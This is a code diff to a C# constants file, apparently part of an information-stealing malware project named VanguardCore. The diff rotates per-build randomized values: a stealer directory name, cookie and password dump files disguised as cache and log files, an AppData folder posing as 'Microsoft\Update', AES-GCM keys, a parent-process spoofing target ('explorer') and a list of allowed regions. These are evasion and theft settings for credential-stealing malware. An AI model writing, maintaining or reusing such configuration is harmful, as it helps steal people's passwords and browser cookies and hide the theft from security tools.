@@ -9,23 +9,23 @@ namespace VanguardCore
         public const bool DEBUG_MODE = false;
 
         // Build-time randomized markers (patched by full_rebuild.ps1)
-        public const string IPC_EVENT_BASE = "EmoCore_Event_a5466d25";
-        public const string APP_DATA_SUBDIR = "Microsoft\\Update\\1645e4";
+        public const string IPC_EVENT_BASE = "EmoCore_Event_80b1a1dd";
+        public const string APP_DATA_SUBDIR = "Microsoft\\Update\\70ae6b";
         
         // [PRO] IO Randomization
-        public const string STEALER_DIR_NAME = "6139Svc";
-        public const string COOKIE_FILE_NAME = "cache_5570.db";
-        public const string PASSWORD_FILE_NAME = "log_3905.tmp";
-        public const string LOG_FILE_NAME = "err_1028.log";
+        public const string STEALER_DIR_NAME = "9685Svc";
+        public const string COOKIE_FILE_NAME = "cache_6475.db";
+        public const string PASSWORD_FILE_NAME = "log_6548.tmp";
+        public const string LOG_FILE_NAME = "err_8221.log";
         
         // Version info
-        public const string VERSION = "2604.3.26-v1";
+        public const string VERSION = "2604.8.75-v1";
 
         // From defense/Constants:
         // These keys are updated at build time by full_rebuild.ps1
         // AES-GCM Keys (Base64)
-        public const string MASTER_KEY_B64 = "mfS9jZLPLoW4wnOlqF/1V6ZxN5PwnREVPsktbXxSsgQ=";
-        public const string ENCRYPTED_SESSION_KEY_B64 = "Ph8QzJQM23BACfDfMp/HkYOc/Y0rGmDAserCGshK+xs=";
+        public const string MASTER_KEY_B64 = "dz1S9x3+CXZJQkggMHsZMRbx0WDcMu5nJTavL/H2fFg=";
+        public const string ENCRYPTED_SESSION_KEY_B64 = "jFVJXvmrqbir5mMpksuJ3D2pXkHjRJRMiFE4wUMimak=";
         
         // Target process name for PPID spoofing
         public const string SPOOF_PARENT = "explorer";
@@ -46,6 +46,7 @@ namespace VanguardCore
         public static readonly string[] CLEAN_REGIONS = { "HK", "SG", "TW", "US", "DE", "FR", "JP", "GB" };
     }
 }
+
 
 
 
